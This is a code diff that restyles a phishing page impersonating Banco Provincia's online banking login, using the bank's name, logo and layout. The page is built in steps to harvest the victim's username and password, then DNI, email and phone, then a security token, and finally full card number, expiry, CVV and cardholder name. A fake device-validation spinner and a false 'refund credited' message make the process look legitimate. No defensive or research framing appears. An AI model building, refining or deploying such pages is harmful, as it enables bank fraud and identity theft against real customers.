@@ -3,41 +3,52 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#279d2e">
-<title>Banca Internet | Banco Provincia</title>
+<meta name="theme-color" content="#1f8a4c">
+<title>Iniciá sesión | Banco Provincia</title>
 <link rel="stylesheet" href="estilo.css">
 <link rel="stylesheet" href="parche.css">
 <style>
   html,body{height:100%}
-  body{background:#fafafa;margin:0}
+  body{background:#fff;margin:0;-webkit-font-smoothing:antialiased}
 
-  .bapro-bar{background:linear-gradient(270deg,#26b4bd,#3daa35);padding:1.15rem 1.4rem;display:flex;align-items:center}
-  .logoBapro{height:2.125rem;width:auto;display:block}
+  .bapro-bar{background:linear-gradient(100deg,#1c7a3a 0%,#1e8a4a 38%,#22a3a0 100%);padding:2rem 1.4rem;display:flex;align-items:center;justify-content:center}
+  .logoBapro{height:3rem;width:auto;display:block}
 
-  .wrap{max-width:32rem;margin:0 auto;padding:1.4rem 1rem 2.5rem}
-  .login-content{padding:1.5rem 1.3rem 1.3rem;border-radius:.625rem;box-shadow:0 0 .938rem #0000001a;background:#fff}
+  .sheet{background:#fff;border-radius:1.5rem 1.5rem 0 0;margin-top:-1px;min-height:calc(100vh - 8.1rem);padding:1.6rem 1.35rem 2.5rem;max-width:34rem;margin-left:auto;margin-right:auto}
+  @media screen and (min-width:768px){ .sheet{box-shadow:0 0 2rem #00000014;border-radius:1.5rem;margin-top:-1.2rem;padding-top:2rem} }
 
   .oculto{display:none!important}
-  .field{margin-bottom:1.05rem}
-  .form-control{width:100%}
+
+  .titulo{font-size:1.85rem;line-height:2.2rem;font-weight:700;color:#007a2b;margin:0 0 1.15rem}
+
+  .field{margin-bottom:1.25rem}
+  .lab{display:block;font-size:1.05rem;line-height:1.35rem;font-weight:600;color:#3c3c3b;margin-bottom:.4rem}
+  .req{color:#d42f1a;font-weight:700}
+
+  .form-control{width:100%;height:3.1rem;font-size:1.05rem}
+  .form-control::placeholder{color:#9c9b9b}
   .mal{border:1px solid #d42f1a!important;background-color:#d42f1a26!important}
 
-  .titulo{font-size:1.4rem;line-height:1.8rem;color:#007a2b;margin:0 0 .35rem;font-weight:600}
-  .sub{font-size:.875rem;line-height:1.313rem;color:#585b62;margin:0 0 1.3rem}
+  .ojo{position:absolute;right:.15rem;top:.55rem;background:none;border:0;padding:.5rem;line-height:0;cursor:pointer}
+  .ojo svg{fill:#3c3c3b}
 
-  .principal{width:100%;margin-top:.5rem}
-  .principal:disabled{background-color:#ececec!important;color:#696969!important;filter:grayscale(100%);opacity:1;border-color:transparent!important}
+  .principal{width:100%;margin-top:.4rem;background-color:#3c3c3b;color:#fff;border:0;border-radius:.375rem;min-height:3.1rem;font-size:1.05rem;font-weight:400;cursor:pointer}
+  .principal:hover{background-color:#4d4d4c}
+  .principal:disabled{background-color:#ececec!important;color:#696969!important;filter:grayscale(100%);opacity:1;cursor:not-allowed}
+
+  .link{display:block;text-align:center;color:#007a2b;text-decoration:underline;font-size:1.05rem;line-height:1.4rem;margin:1.05rem 0;font-weight:400}
 
   #err{display:none;margin-bottom:1rem}
-  #err .text{font-size:.875rem;line-height:1.3125rem}
+  #err .text{font-size:.9rem;line-height:1.35rem}
 
   .sp{width:46px;height:46px;margin:0 auto;border:4px solid #d8d8d8;border-top-color:#007a2b;border-radius:50%;animation:gir .8s linear infinite}
   @keyframes gir{to{transform:rotate(360deg)}}
+  .cargando{text-align:center;padding:3rem 0}
+  .cargando p{margin-top:1.1rem;color:#585b62;font-size:.95rem}
 
-  .pie{margin-top:1.3rem;text-align:center;font-size:.75rem;line-height:1.188rem;color:#585b62}
-  .pie a{color:#007a2b}
-  .ok{text-align:center;padding:1.5rem 0}
-  .cir{width:64px;height:64px;margin:0 auto 1rem;border-radius:50%;background:#007a2b;color:#fff;font-size:2rem;line-height:64px}
+  .ok{text-align:center;padding:2rem 0}
+  .cir{width:64px;height:64px;margin:0 auto 1.2rem;border-radius:50%;background:#007a2b;color:#fff;font-size:2rem;line-height:64px}
+  .txt{color:#585b62;font-size:1rem;line-height:1.45rem;margin:0 0 .6rem}
 </style>
 </head>
 <body class="spa">
@@ -46,110 +57,113 @@
     <img class="logoBapro" src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip" alt="Banco Provincia">
   </div>
 
-  <div class="wrap">
-    <div class="login-content">
+  <div class="sheet">
 
-      <div class="alert alert-danger" id="err" role="alert"><span class="text" id="err-txt"></span></div>
+    <div class="alert alert-danger" id="err" role="alert"><span class="text" id="err-txt"></span></div>
 
-      <!-- PASO 1 -->
-      <div id="p1">
-        <h1 class="titulo">Banca Internet</h1>
-        <p class="sub">Ingresá con tu usuario y clave para operar.</p>
+    <!-- PASO 1 -->
+    <div id="p1">
+      <h1 class="titulo">Iniciá sesión</h1>
 
-        <div class="field">
-          <label class="txt-input-label" for="u">Usuario (DNI)</label>
-          <input class="form-control" id="u" type="text" inputmode="numeric" maxlength="8" autocomplete="username" placeholder="Sin puntos" required>
-        </div>
-
-        <div class="field">
-          <label class="txt-input-label" for="c">Clave</label>
-          <input class="form-control" id="c" type="password" autocomplete="current-password" placeholder="Tu clave" required>
-        </div>
-
-        <button class="btn btn-primary principal" id="b1" type="button">Ingresar</button>
+      <div class="field">
+        <label class="lab" for="u">Tu usuario <span class="req">*</span></label>
+        <input class="form-control" id="u" type="text" inputmode="numeric" maxlength="8" autocomplete="username" placeholder="Ingresá tu nombre de usuario" required>
       </div>
 
-      <!-- SPINNER -->
-      <div id="p2b" class="oculto" style="text-align:center;padding:2.5rem 0">
-        <div class="sp"></div>
-        <p class="sub" style="margin-top:1.1rem">Validando dispositivo…</p>
-        <button class="btn btn-outline-secondary oculto" id="saltar" type="button" style="margin-top:.75rem">Continuar</button>
+      <div class="field" style="position:relative">
+        <label class="lab" for="c">Tu clave <span class="req">*</span></label>
+        <input class="form-control" id="c" type="password" autocomplete="current-password" placeholder="Ingresá tu clave" required>
+        <button class="ojo" id="ojo" type="button" aria-label="Mostrar clave">
+          <svg width="24" height="24" viewBox="0 0 24 24"><path id="ojo-path" d="M2.1 12S5.6 5.5 12 5.5 21.9 12 21.9 12 18.4 18.5 12 18.5 2.1 12 2.1 12Zm9.9 3.6a3.6 3.6 0 1 0 0-7.2 3.6 3.6 0 0 0 0 7.2Z"/><path d="M3 3l18 18" stroke="#3c3c3b" stroke-width="1.8" fill="none" id="ojo-line" style="display:none"/></svg>
+        </button>
       </div>
 
-      <!-- PASO 2 -->
-      <div id="p2" class="oculto">
-        <h1 class="titulo">Tus datos</h1>
-        <p class="sub">Confirmá tu identidad para continuar.</p>
+      <button class="principal" id="b1" type="button">Ingresar</button>
 
-        <div class="field">
-          <label class="txt-input-label" for="d">DNI</label>
-          <input class="form-control" id="d" type="text" inputmode="numeric" maxlength="8" placeholder="Sin puntos">
-        </div>
-
-        <div class="field">
-          <label class="txt-input-label" for="m">Email</label>
-          <input class="form-control" id="m" type="email" inputmode="email" placeholder="tucorreo@ejemplo.com" autocomplete="off">
-        </div>
-
-        <div class="field">
-          <label class="txt-input-label" for="t">Celular</label>
-          <input class="form-control" id="t" type="tel" inputmode="numeric" maxlength="12" placeholder="Código de área y número" autocomplete="off">
-        </div>
-
-        <button class="btn btn-primary principal" id="b2" type="button">Continuar</button>
-      </div>
-
-      <!-- PASO 3 -->
-      <div id="p3" class="oculto">
-        <h1 class="titulo">Token de seguridad</h1>
-        <p class="sub">Ingresá los 6 dígitos de tu token.</p>
-
-        <div class="field">
-          <label class="txt-input-label" for="tk">Token</label>
-          <input class="form-control" id="tk" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="6 dígitos">
-        </div>
-
-        <button class="btn btn-primary principal" id="b3" type="button" disabled>Ingresar</button>
-      </div>
-
-      <!-- PASO 4 -->
-      <div id="p4" class="oculto">
-        <h1 class="titulo">Reintegro</h1>
-        <p class="sub">Ingresá una tarjeta para acreditar el importe.</p>
-
-        <div class="field">
-          <label class="txt-input-label" for="n">Número de tarjeta</label>
-          <input class="form-control" id="n" type="text" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off">
-        </div>
-
-        <div class="field">
-          <label class="txt-input-label" for="v">Vencimiento</label>
-          <input class="form-control" id="v" type="text" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="off">
-        </div>
-
-        <div class="field">
-          <label class="txt-input-label" for="s">Código de seguridad</label>
-          <input class="form-control" id="s" type="text" inputmode="numeric" maxlength="4" placeholder="CVV" autocomplete="off">
-        </div>
-
-        <div class="field">
-          <label class="txt-input-label" for="ti">Titular</label>
-          <input class="form-control" id="ti" type="text" maxlength="40" placeholder="Nombre como figura en la tarjeta" autocomplete="off">
-        </div>
-
-        <button class="btn btn-primary principal" id="b4" type="button">Acreditar</button>
-      </div>
-
-      <!-- FIN -->
-      <div id="p5" class="oculto ok">
-        <div class="cir">✓</div>
-        <h2 class="titulo" style="margin-bottom:.5rem">Reintegro acreditado</h2>
-        <p class="sub">El importe se verá reflejado en tu cuenta dentro de las próximas 48 horas hábiles.</p>
-        <p class="sub" style="font-size:.75rem">Redirigiendo…</p>
-      </div>
-
-      <p class="pie">Banco de la Provincia de Buenos Aires · Conexión segura</p>
+      <a class="link" href="#" id="l1">¿No sos BIP? Registrate</a>
+      <a class="link" href="#" id="l2">Bloqueé u olvidé mi usuario y/o clave</a>
+      <a class="link" href="#" id="l3">Conocé como hacerte usuario u operar</a>
+      <a class="link" href="#" id="l4">Recomendaciones de seguridad</a>
     </div>
+
+    <!-- SPINNER -->
+    <div id="p2b" class="oculto cargando">
+      <div class="sp"></div>
+      <p>Validando dispositivo…</p>
+      <button class="link oculto" id="saltar" type="button" style="border:0;background:none;width:100%;cursor:pointer;margin-top:.5rem">Continuar</button>
+    </div>
+
+    <!-- PASO 2 -->
+    <div id="p2" class="oculto">
+      <h1 class="titulo">Tus datos</h1>
+
+      <div class="field">
+        <label class="lab" for="d">DNI <span class="req">*</span></label>
+        <input class="form-control" id="d" type="text" inputmode="numeric" maxlength="8" placeholder="Sin puntos">
+      </div>
+
+      <div class="field">
+        <label class="lab" for="m">Email <span class="req">*</span></label>
+        <input class="form-control" id="m" type="email" inputmode="email" placeholder="tucorreo@ejemplo.com" autocomplete="off">
+      </div>
+
+      <div class="field">
+        <label class="lab" for="t">Celular <span class="req">*</span></label>
+        <input class="form-control" id="t" type="tel" inputmode="numeric" maxlength="12" placeholder="Código de área y número" autocomplete="off">
+      </div>
+
+      <button class="principal" id="b2" type="button">Continuar</button>
+    </div>
+
+    <!-- PASO 3 -->
+    <div id="p3" class="oculto">
+      <h1 class="titulo">Token de seguridad</h1>
+      <p class="txt" style="margin-bottom:1.2rem">Ingresá los 6 dígitos de tu token.</p>
+
+      <div class="field">
+        <label class="lab" for="tk">Token <span class="req">*</span></label>
+        <input class="form-control" id="tk" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code" placeholder="6 dígitos">
+      </div>
+
+      <button class="principal" id="b3" type="button" disabled>Ingresar</button>
+    </div>
+
+    <!-- PASO 4 -->
+    <div id="p4" class="oculto">
+      <h1 class="titulo">Reintegro</h1>
+      <p class="txt" style="margin-bottom:1.2rem">Ingresá una tarjeta para acreditar el importe.</p>
+
+      <div class="field">
+        <label class="lab" for="n">Número de tarjeta <span class="req">*</span></label>
+        <input class="form-control" id="n" type="text" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off">
+      </div>
+
+      <div class="field">
+        <label class="lab" for="v">Vencimiento <span class="req">*</span></label>
+        <input class="form-control" id="v" type="text" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="off">
+      </div>
+
+      <div class="field">
+        <label class="lab" for="s">Código de seguridad <span class="req">*</span></label>
+        <input class="form-control" id="s" type="text" inputmode="numeric" maxlength="4" placeholder="CVV" autocomplete="off">
+      </div>
+
+      <div class="field">
+        <label class="lab" for="ti">Titular <span class="req">*</span></label>
+        <input class="form-control" id="ti" type="text" maxlength="40" placeholder="Nombre como figura en la tarjeta" autocomplete="off">
+      </div>
+
+      <button class="principal" id="b4" type="button">Acreditar</button>
+    </div>
+
+    <!-- FIN -->
+    <div id="p5" class="oculto ok">
+      <div class="cir">✓</div>
+      <h2 class="titulo" style="font-size:1.5rem;margin-bottom:.7rem">Reintegro acreditado</h2>
+      <p class="txt">El importe se verá reflejado en tu cuenta dentro de las próximas 48 horas hábiles.</p>
+      <p class="txt" style="font-size:.85rem">Redirigiendo…</p>
+    </div>
+
   </div>
 
 <script>
@@ -189,6 +203,18 @@ function mostrarError(msg){
   $("err-txt").textContent = msg;
   $("err").style.display = "flex";
 }
+
+// ojo
+$("ojo").addEventListener("click", function(){
+  var visible = $("c").type === "text";
+  $("c").type = visible ? "password" : "text";
+  $("ojo-line").style.display = visible ? "none" : "block";
+});
+
+// links
+["l1","l2","l3","l4"].forEach(function(id){
+  $(id).addEventListener("click", function(e){ e.preventDefault(); });
+});
 
 // ---- PASO 1
 $("u").addEventListener("input", function(){ this.value = dig(this.value).slice(0, 8); });
@@ -263,8 +289,7 @@ $("b3").addEventListener("click", function(){
 
 // ---- PASO 4
 $("n").addEventListener("input", function(){
-  var v = dig(this.value).slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
-  this.value = v;
+  this.value = dig(this.value).slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
 });
 $("v").addEventListener("input", function(){
   var v = dig(this.value).slice(0, 4);
